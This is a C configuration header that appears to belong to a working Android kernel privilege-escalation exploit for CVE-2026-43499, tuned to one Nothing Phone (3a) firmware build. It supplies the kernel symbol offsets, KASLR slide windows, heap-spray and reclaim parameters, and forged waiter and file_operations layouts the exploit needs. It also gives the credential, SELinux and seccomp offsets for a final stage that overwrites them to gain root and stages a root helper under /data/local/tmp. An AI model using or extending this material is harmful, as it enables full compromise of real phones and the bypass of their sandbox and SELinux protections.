#ifndef TARGET_H
#define TARGET_H

/* Shared core61 capability selection.  These are behavior/capability flags,
 * not runtime device checks; another exact target may reuse the profile. */
#define RMD_CORE61_DIRECT_CRED_ROUTE 1
#define RMD_SUPERVISOR_RETRY_STATE 1
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define SUPERVISED_RETRY_STATE 1
#endif

/* Nothing Phone (3a) A059 "Asteroids", Qualcomm SM7635 (Snapdragon 7s Gen 3)
 *
 *   kernel 6.1.157-android14-11-g82d681c9b06b-ab14634535  (GKI, 4K pages)
 *   build  Nothing/AsteroidsJPN/Asteroids:16/BQ2A.250721.001-
 *          BP2A.250605.031.A3/2606181048:user/release-keys
 *   SPL    2026-06-01
 *
 * The bug is unfixed in this image. remove_waiter() is out of line at image
 * offset 0x01013714 and operates on `current` rather than on waiter->task --
 *
 *     mrs x20, SP_EL0
 *     add x22, x20, #0x924        ; current->pi_lock
 *     str xzr, [x20, #0x950]      ; current->pi_blocked_on = NULL
 *
 * -- and rt_mutex_start_proxy_lock+0x44 calls it on the failure path. That is
 * the unfixed shape of CVE-2026-43499. The same disassembly re-confirms
 * FAKE_TASK_PI_LOCK_OFF and FAKE_TASK_PI_BLOCKED_ON_OFF below, and
 * task_blocks_on_rt_mutex's stores re-confirm the whole waiter layout.
 *
 * This kernel has the pre-split rt_mutex_waiter -- one prio/deadline pair,
 * 0x58 bytes -- which is COMPACT_RT_MUTEX_WAITER below.
 *
 * Every value in this header is derived from this build's own boot.img
 * (sha256 68b12e1148598a187bb73711a675f615c2bf5236929ecca27e701459a6bd4a1f,
 * decompressed Image sha256
 * b344ddc133e77cb2924a5bdfac268509d542168c546b05c4443a23cceeea1a73).
 * Nothing was copied from another target.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "asteroids-B4.1-260618-1048-app"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "asteroids-B4.1-260618-1048-root-direct-cred"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "Nothing/AsteroidsJPN/Asteroids:16/BQ2A.250721.001-" \
  "BP2A.250605.031.A3/2606181048:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
/* memstart_addr: every DRAM node in the vendor_boot DTBs starts at
 * 0x80000000 (gunyah_hyp_region@80000000 is the first reserved region), the
 * Qualcomm DRAM base for this platform. The 1 GiB shift
 * arm64_memblock_init() can apply from memstart_offset_seed is guarded by
 * `linear_region_size - BIT(parange) >= ARM64_MEMSTART_ALIGN`, negative at
 * VA_BITS=39, so the randomisation never fires whatever the seed.
 *
 * P0_KERNEL_PHYS_LOAD comes from this firmware's xbl_config.img, not from a
 * neighbouring target: its second FDT reserves /soc/memorymap/memory@A8000000
 * as MemLabel="Kernel", reg=<0 0xA8000000 0 0x10000000>. The running image is
 * 0x80000 into that reservation. That intra-reservation offset is independently
 * visible in every tracefs KASLR sample: the runtime worker_thread caller is
 * 0x80000 off the 2 MiB grid relative to the link address, and the kernel logs
 * "Kernel image misaligned at boot". Therefore _text is physically loaded at
 * 0xA8000000 + 0x80000 = 0xA8080000. A full CFI run using this delta also read
 * back the Asteroids-owned misc_fops target; the old 0x80800000 hypothesis did
 * not. Only the delta reaches the payload through P0_DATA_ALIAS_CONST(). */
#define P0_PHYS_OFFSET 0x80000000ULL
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0xa8080000ULL
#endif

/* Where the sprayed payload starts relative to the leaked page. A property of
 * the skb allocation rather than of this firmware, and the same -0xe80 on
 * every android14-6.1 target the core has run on. */
#define SKB_DATA_DELTA (-0xe80LL)

/* The mm_struct slab's object size, which is the stride the leak sweeps and
 * the divisor every grooming count is sized from. Read off the device, where
 * /proc/slabinfo answers it outright --
 *
 *     mm_struct  533 544 1024 32 8
 *
 * -- 1024-byte objects, 32 to a slab, 8 pages to a slab, which is also the
 * MM_ORDER 3 the core already assumes. It agrees with the image: BTF gives
 * sizeof(struct mm_struct) = 0x3c0, mm_init() adds cpumask_size() and asks
 * for SLAB_HWCACHE_ALIGN, and 0x3c8 rounded up to a cache line is 0x400. */
#define MM_STRUCT_SZ 0x400

/* Asteroids selected false-positive page candidates at eight independent
 * futex-hash collisions: the resulting fake_lock failed the first
 * rt_mutex_top_waiter invariant before any target write. Sixteen keeps the
 * correlation target-specific and is still small compared with the appended
 * futex bank used by the application P0 oracle. */
#define KSNITCH_COLLISIONS 16
/* Four saved successful CFI runs use this exact 1 MiB / 32-send profile. */
#define SKB_RECLAIM_SENDS 32
#define SKB_RECLAIM_SNDBUF (1 << 20)
#define APP_SLIDE_RECLAIM_SENDS 32
/* Keep the page-gated PI-node route as production. The direct stack
 * tree-write can update ashmem_miscs even when only the zero fake-lock area
 * was reclaimed, leaving it pointing at an incomplete fake fops table. */
#define PSELECT_TREE_WRITE_DEFAULT 0
#define DEFAULT_PSELECT_DELAY_USEC 50000
#define PAYLOAD_ATTEMPT_TIMEOUT_SEC 300

/* The gated (fake-waiter PI-node) write needs the real waiter to become the
 * new top after sched_setattr(nice=19). That real normal priority is 139;
 * using the comparison sentinel 140 makes 139 sort before it. The generic
 * value 130 leaves the fake waiter on top, so rt_mutex_dequeue_pi() never
 * consumes the sprayed PI node and the gated write never fires. 140 is only
 * stored in the forged waiter and is used by rt_mutex_waiter_less(); it is
 * never installed as a task priority. */
#define FAKE_WAITER_PRIO 140

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define COMPACT_RT_MUTEX_WAITER 1

/* __TRACE_LAST_TYPE is 20 on android14-6.1; the zero-based index of
 * __event_sched_blocked_reason in the ftrace events linker section is
 * (0xffffffc009fd3c30 - 0xffffffc009fd3980) / 8 = 86, so the runtime event
 * ID is 20 + 86 = 106. Matches the device:
 * /sys/kernel/tracing/events/sched/sched_blocked_reason/id reads 106. */
#define SLIDE_TRACEFS_EVENT_ID 106
/* worker_thread + 0xa0: the instruction immediately after the blocking
 * `bl schedule` at 0xffffffc0080daeac. */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000daeb0ULL

/* How many 64-bit words of core_sys_select's stack_fds[] precede word zero of
 * the freed rt_mutex_waiter. Both syscalls are entered from invoke_syscall at
 * the same SP, so it is the difference between how far each buries its own
 * local, read off this image:
 *
 *   __arm64_sys_futex 0x70 + do_futex 0x60 + futex_wait_requeue_pi 0x1b0,
 *     rt_waiter at sp+0x98         -> 0x1e8 below the entry SP
 *   __arm64_sys_pselect6 0x90 + core_sys_select 0x1c0,
 *     stack_fds at sp+0x50         -> 0x200 below it
 *
 *   (0x200 - 0x1e8) / 8 = 3
 */
#define SLIDE_PSELECT_WORD_SHIFT 3

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER "p0_fingerprint.h"
#endif

/* This device runs arm64 KASLR off a bootloader seed
 * (CONFIG_RANDOMIZE_BASE=y, __pi_kaslr_early_init present in the image), so
 * the kworker caller the leak reads sits gigabytes from its link address
 * rather than the sub-2 MiB the core's Samsung targets see. The window is
 * exactly what kaslr_early_init() can return -- BIT(VA_BITS_MIN - 3) +
 * (seed & mask), mask cleared below MIN_KIMG_ALIGN, at VA_BITS_MIN 39 -- and
 * the alignment is MIN_KIMG_ALIGN.
 *
 * SLIDE_P0_TRACKS_KASLR 0 because that offset moves the image's virtual
 * mapping only: the linear map is built from memblock and the physmap alias
 * of an image symbol does not follow it, so data_addr() takes no correction.
 *
 * ALIGN is 512 KiB, not 2 MiB: on this device the
 * observed worker_thread+0xa0 caller reads low-21-bits 0x15aeb0 against the
 * link-time 0xdaeb0, i.e. the running image sits 0x80000 above the 2 MiB
 * grid (xbl_config reserves the Kernel region at 0xA8000000 and places the
 * Image at 0xA8080000, and the mapping follows that physical placement).
 * kaslr_early_
 * init returns BIT(36)+(seed&GENMASK(36,0)) and head.S masks it to 2 MiB,
 * but the *effective* base picks up the 512 KiB physical misalignment folded
 * into x23, so the slide values that actually occur are 0x80000-granular.
 * Measured on-device: slide 0x1c27c80000 (0x1c27c80000 % 0x80000 == 0, and
 * % 0x200000 == 0x80000). MIN/MAX are the kaslr_early_init window.
 */
#define SLIDE_KASLR_MIN 0x1000000000ULL
#define SLIDE_KASLR_MAX 0x2fffe00000ULL
#define SLIDE_KASLR_ALIGN 0x80000ULL
#define SLIDE_P0_TRACKS_KASLR 0

/* --------------------------------------------------------- generated ---
 * Symbol offsets recovered from this build's boot.img (vmlinux-to-elf,
 * llvm-nm; recovered ELF base 0xffffffc008000000). Layout values are from
 * this image's own BTF. Regenerate rather than editing a number.
 */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define NOOP_LLSEEK_OFF 0x00398408ULL
#define COPY_SPLICE_READ_OFF 0x003e5d00ULL
#define CONFIGFS_READ_ITER_OFF 0x0046412cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0046465cULL
#define ASHMEM_IOCTL_OFF 0x00c385a8ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c38ee0ULL
#define ASHMEM_MMAP_OFF 0x00c38f38ULL
#define ASHMEM_OPEN_OFF 0x00c39158ULL
#define ASHMEM_RELEASE_OFF 0x00c391e0ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c39300ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01109890ULL
#define ASHMEM_FOPS_OFF 0x01280ad0ULL
#define KMALLOC_CACHES_OFF 0x015cdcf8ULL
#define SELINUX_BLOB_SIZES_OFF 0x015ce8c8ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0200ae60ULL
#define INIT_TASK_OFF 0x0201f640ULL
#define ROOT_TASK_GROUP_OFF 0x02208580ULL
/* selinux_state.enforcing is the first member, so the object itself. */
#define SELINUX_ENFORCING_OFF 0x0225a420ULL

#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x020129d0ULL
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01528344ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02137d08ULL
#define SLIDE_SYSCTL_BOOTID_OFF 0x0227b498ULL
/* ashmem_miscs[0] + offsetof(struct miscdevice, fops) == +0x10 */
#define ASHMEM_MISC_FOPS_OFF 0x0217cb80ULL

/* rt_mutex_waiter, 0x58 bytes: pi_tree_entry@0x18, task@0x30, lock@0x38,
 * wake_state@0x40, prio@0x44, deadline@0x48, ww_ctx@0x50. */
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58

/* task_struct, 4800 bytes. */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x924
#define FAKE_TASK_PI_WAITERS_OFF 0x938
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950

/* struct configfs_buffer */
#define CFG_PAGE_OFF 0x10
#define CFG_NEEDS_READ_FILL_OFF 0x50
#define CFG_BIN_BUFFER_OFF 0x58
#define CFG_BIN_BUFFER_SIZE_OFF 0x60
#define CFG_CB_MAX_SIZE_OFF 0x64

/* workqueue_struct / pool_workqueue / worker_pool / work_struct */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

/* struct page / struct slab, 0x40 bytes */
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30
#define STRUCT_PAGE_SIZE 0x40

/* struct file_operations, 0x110 bytes */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0
/* ----------------------------------------------------- end generated --- */

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)

#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Where each faked object sits inside the reclaimed order-3 page. LOCK_OFF is
 * intentionally Asteroids-specific even though it is spray geometry. With
 * SKB_DATA_DELTA=-0xe80, 0x2130 places the live fake lock at page+0x12b0:
 * offset 0x2b0 in one 0x400-byte mm_struct slab object.
 *
 * Asteroids BTF puts mm_struct.saved_auxv at [0x160,0x2d0), 46 qwords. The
 * target process exposes 21 auxv pairs including AT_NULL (42 qwords), and
 * create_elf_tables() clears the remainder of saved_auxv. The four qwords at
 * [0x2b0,0x2d0) are therefore a zero rt_mutex_base on a reclaim miss: spinlock,
 * rb_root, rb_leftmost and owner. This matters because the previous +0x2d0
 * placement was mm_rss_stat, whose counters are not guaranteed to be zero;
 * one miss reached rt_mutex_top_waiter() and hit its w->lock != lock BUG_ON.
 * A runtime /proc/self/auxv guard below refuses the route if a future process
 * image uses more than the 42 qwords this geometry permits. */
#define MM_AUXV_TAIL_LOCK 1
#define MM_SAVED_AUXV_OFF 0x160
#define MM_SAVED_AUXV_QWORDS 46
#define MM_AUXV_LOCK_OBJECT_OFF 0x2b0
#define MM_AUXV_LOCK_MAX_PROC_BYTES 0x150
#define LOCK_OFF 0x2130
#define W0_OFF 0x2350
/* Put the fake table at page+0x16c8, or mm object +0x2c8. If the PI-node
 * write somehow lands while that object still contains a dead mm_struct,
 * every operation reached before the CFI readback fails closed:
 *
 *   fops.owner            -> saved_auxv tail +0x18 = 0
 *   fops.unlocked_ioctl   -> context.flags          = 0 (AArch64 exec)
 *   fops.open             -> owner                  = 0 (mm_update_next_owner)
 *   fops.release          -> exe_file               = 0 (__mmput)
 *
 * misc_open therefore cannot call try_module_get/open through a small stale
 * value, and the first ASHMEM_SET_NAME returns ENOTTY before pread/pwrite can
 * use any other stale slot. On a successful skb reclaim the full forged table
 * overwrites this region. LOCK_OFF, FOPS_OFF and W0_OFF all resolve into the
 * same page+0x1000 4K page, so a page-granular copy cannot supply the lock and
 * PI node without also supplying the table. */
#define MM_STALE_FOPS_FAILSAFE 1
#define MM_FOPS_OBJECT_OFF 0x2c8
#define FOPS_OFF 0x2548
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define PIPE_BUFFER_SLOTS 32
#define PIPE_SKB_RECLAIM_SENDS 128
#define PIPE_SKB_RECLAIM_SNDBUF (4 << 20)
#define PIPE_DRAIN_SLABS 1
#define PIPE_RECLAIM_SLABS 15
#define PIPE_KMALLOC_SKB_DRAIN_OBJECTS 4096
#define PIPE_KMALLOC_SKB_DRAIN_PAIRS 32
#define PIPE_KMALLOC_SKB_DRAIN_SIZE 1024
#define PIPE_KMALLOC_SKB_DRAIN_SNDBUF (1 << 20)
/* The second mm page is already pinned while KernelSnitch computes its direct
 * address. Draining kmalloc-2k first and closing that final memfd immediately
 * before the reclaim arrays avoids the unreliable mm -> skb -> pipe double
 * transition seen on Asteroids. Target BTF gives skb_shared_info size 344
 * (384 after cache-line alignment), so a 1024-byte AF_UNIX payload requests a
 * 1408-byte skb head and rounds to kmalloc-2k. These held skb heads consume
 * existing partials without hitting the shell user's pipe-page quota; the
 * runtime cache gate still requires the pipe cache alias before any physrw. */
#define PIPE_DIRECT_MM_RECLAIM 1
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* The kmalloc cache the pipe-buffer reclaim identifies. Pipe buffer arrays
 * are GFP_KERNEL_ACCOUNT, so they come from the KMALLOC_CGROUP set, and the
 * leak's cache gate reads kmalloc_caches[type][index] to recognise the page.
 * This kernel's `enum kmalloc_cache_type` reads NORMAL=0, DMA=0 (alias,
 * CONFIG_ZONE_DMA off), CGROUP=1, RECLAIM=2, NR_KMALLOC_TYPES=3 -- not the
 * core's Samsung default of CGROUP=2 out of a four-type table. */
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

/* ------------------------------------------------------- deployment ---
 * Not about the kernel: where the bring-up run stages the bootstrap helper,
 * and where in the reclaimed page the usermodehelper work item is built.
 */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* ----------------------------------------------------- direct root ---
 * Asteroids BTF-derived layouts used by the post-physrw credential stage.
 * These deliberately differ from tokay where this task_struct is shifted by
 * 0x18 after atomic_flags: all values below are from this boot.img's BTF.
 * selinux_blob_sizes is from this image's own llvm-nm output above. */
#define TASK_TASKS_OFF 0x550
#define TASK_ATOMIC_FLAGS_OFF 0x5f0
#define TASK_PID_OFF 0x630
#define TASK_TGID_OFF 0x634
#define TASK_THREAD_GROUP_OFF 0x6e0
#define TASK_REAL_CRED_OFF 0x830
#define TASK_CRED_OFF 0x838
#define TASK_COMM_OFF 0x848
#define TASK_SECCOMP_OFF 0x900
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_COMM_LEN 16

/* The live pselect waiter must have its stale pi_blocked_on cleared before it
 * can unlock or exit. These are this image's task_struct BTF members. */
#define DIRECT_WAITER_PI_CLEANUP 1
#define TASK_PI_LOCK_OFF 0x924
#define TASK_PI_WAITERS_OFF 0x938
#define TASK_PI_TOP_TASK_OFF 0x948
#define TASK_PI_BLOCKED_ON_OFF 0x950

#define CRED_UID_OFF 0x04
#define CRED_SECUREBITS_OFF 0x24
#define CRED_CAPS_OFF 0x28
#define CRED_SECURITY_OFF 0x78
#define CRED_CAP_WORDS 5

#define SELINUX_CRED_OSID_OFF 0x00
#define SELINUX_CRED_SID_OFF 0x04
#define SELINUX_KERNEL_SID 1

#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

#endif
